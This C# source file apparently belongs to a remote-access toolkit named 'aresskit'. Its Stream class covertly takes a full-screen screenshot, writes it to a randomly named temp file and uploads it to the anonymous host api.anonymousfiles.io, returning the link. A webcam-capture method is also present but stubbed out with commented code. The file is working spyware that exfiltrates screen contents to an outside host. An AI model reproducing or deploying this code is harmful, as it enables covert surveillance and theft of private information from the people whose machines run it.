using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;
using Newtonsoft.Json;

namespace aresskit

{
    // Thanks to: http://stackoverflow.com/a/18870847/5925502
    class Stream
    {
        private static Bitmap Capture(int x, int y, int width, int height)
        {
            Bitmap screenShotBMP = new Bitmap(width, height, System.Drawing.Imaging.PixelFormat.Format32bppArgb);

            Graphics screenShotGraphics = Graphics.FromImage(screenShotBMP);

            screenShotGraphics.CopyFromScreen(new Point(x, y), Point.Empty, new Size(width, height), CopyPixelOperation.SourceCopy);
            screenShotGraphics.Dispose();

            return screenShotBMP;
        }

        public static string CaptureScreenshot()
        {
            // Capture Screenshot
            Bitmap myImage = Capture(0, 0, Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            string ImagePath = System.IO.Path.GetTempPath() + Misc.RandomString(16) + ".png";
            myImage.Save(ImagePath, ImageFormat.Png);

            // Upload File to AnonymousFiles
            dynamic json = JsonConvert.DeserializeObject(FileHandler.uploadFile(ImagePath, "https://api.anonymousfiles.io"));
            return json.url;
        }

        public static string CaptureCamera()
        {
            // Capture Pic from Camera
            /*
            CameraCaptureUI captureUI = new CameraCaptureUI();
            captureUI.PhotoSettings.Format = CameraCaptureUIPhotoFormat.Jpeg;
            captureUI.PhotoSettings.CroppedSizeInPixels = new Size(200, 200);

            StorageFile photo = await captureUI.CaptureFileAsync(CameraCaptureUIMode.Photo);
            //*/

            return "";
        }
    }
}
